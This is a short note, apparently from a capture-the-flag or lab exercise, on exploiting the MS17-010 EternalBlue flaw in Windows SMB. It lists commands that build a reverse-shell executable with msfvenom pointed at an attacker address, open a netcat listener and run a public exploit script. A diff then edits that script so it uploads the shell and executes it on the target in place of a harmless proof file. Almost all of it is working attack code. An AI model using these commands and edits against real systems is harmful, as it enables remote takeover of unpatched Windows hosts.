---
title: MS17-010 "Eternal Blue"
created: '2021-07-01T16:59:12.534Z'
modified: '2021-07-01T18:09:02.686Z'
---

# MS17-010 "Eternal Blue"

```
git clone https://github.com/worawit/MS17-010.git
msfvenom -p windows/shell_reverse_tcp -f exe EXITFUNC=thread LHOST=10.10.14.13 LPORT=1337 -o shellcode.exe
nc -nvlp 1337
python zzz_exploit.py 10.10.10.40 ntsvcs
```

edits made:
```
diff --git a/zzz_exploit.py b/zzz_exploit.py
index f1bf4cf..11b1600 100644
--- a/zzz_exploit.py
+++ b/zzz_exploit.py
@@ -31,7 +31,7 @@ Tested on:
 - Windows 2000 SP4 x86
 '''
 
-USERNAME = ''
+USERNAME = '\\'
 PASSWORD = ''
 
 '''
@@ -972,14 +972,8 @@ def get_group_data_from_token(info, tokenData):
 def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()
        
-       print('creating file c:\\pwned.txt on the target')
-       tid2 = smbConn.connectTree('C$')
-       fid2 = smbConn.createFile(tid2, '/pwned.txt')
-       smbConn.closeFile(tid2, fid2)
-       smbConn.disconnectTree(tid2)
-       
-       #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
-       #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+       smb_send_file(smbConn, 'shellcode.exe', 'C', '/shellcode.exe')
+       service_exec(conn, r'cmd /c c:\shellcode.exe')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."
```
